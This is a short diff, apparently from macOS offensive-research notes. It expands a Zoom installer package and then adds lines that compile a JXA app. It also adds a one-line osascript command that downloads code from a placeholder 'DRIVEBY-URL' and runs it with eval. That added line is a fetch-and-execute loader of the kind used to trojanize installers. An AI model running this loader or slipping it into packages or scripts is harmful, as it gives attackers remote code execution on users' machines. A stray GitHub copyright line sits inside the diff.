@@ -1,2 +1,6 @@
 //expand pkg
 pkgutil –expand ~/Downloads/zoomusInstaller.pkg ~/Downloads/zoomusInstaller-expanded.pkg
+
+osacompile -l JavaScript -o app.app -s app.js
+osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('DRIVEBY-URL')),$.NSUTF8StringEncoding)));"
+© 2020 GitHub, Inc.
